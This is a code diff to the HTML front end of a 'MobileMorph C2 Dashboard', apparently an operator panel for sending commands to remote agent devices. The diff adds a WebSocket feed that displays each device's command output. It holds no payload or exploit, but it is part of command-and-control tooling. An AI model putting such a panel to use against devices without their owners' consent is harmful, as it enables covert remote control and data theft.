@@ -4,10 +4,13 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MobileMorph C2 Dashboard</title>
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js" crossorigin="anonymous"></script>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body {
       background-color: #f8f9fa;
+      font-family: Arial, sans-serif; 
+      padding: 20px; 
     }
     .navbar {
       background-color: #343a40;
@@ -23,6 +26,14 @@
       text-align: center;
       color: #6c757d;
     }
+    pre {
+      background-color: #eee;
+      padding: 10px;
+      border-radius: 5px;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-x: auto;
+    }
   </style>
 </head>
 <body>
@@ -34,9 +45,7 @@
 
   <div class="container">
     <div class="card shadow">
-      <div class="card-header bg-primary text-white">
-        Send Command to Agent
-      </div>
+      <div class="card-header bg-primary text-white">Send Command to Agent</div>
       <div class="card-body">
         <form id="commandForm">
           <div class="mb-3">
@@ -53,16 +62,34 @@
       </div>
     </div>
 
+    <div class="card mt-4 shadow">
+      <div class="card-header bg-dark text-white">Latest Results</div>
+      <div class="card-body">
+        <pre id="results">Waiting for agent output...</pre>
+      </div>
+    </div>
+
     <div class="footer">
       <p>&copy; 2025 MobileMorph Labs</p>
     </div>
   </div>
 
   <script>
+    const socket = io();
+
+    socket.on("connect", () => {
+      console.log("✓ Connected to WebSocket server");
+    });
+
+    socket.on("command_result", (data) => {
+      const resultBox = document.getElementById("results");
+      resultBox.textContent = `[${new Date().toLocaleTimeString()}] ${data.device_id}: ${data.output}`;
+    });
+
     document.getElementById("commandForm").addEventListener("submit", function (e) {
       e.preventDefault();
-      const deviceId = document.getElementById("deviceId").value;
-      const command = document.getElementById("command").value;
+      const deviceId = document.getElementById("deviceId").value.trim();
+      const command = document.getElementById("command").value.trim();
 
       fetch("/set_command", {
         method: "POST",
@@ -72,7 +99,7 @@
       .then(res => res.json())
       .then(data => {
         document.getElementById("responseMsg").innerHTML =
-          `<div class='alert alert-info'>${JSON.stringify(data)}</div>`;
+          `<div class='alert alert-info'>${data.status}</div>`;
       })
       .catch(err => {
         document.getElementById("responseMsg").innerHTML =
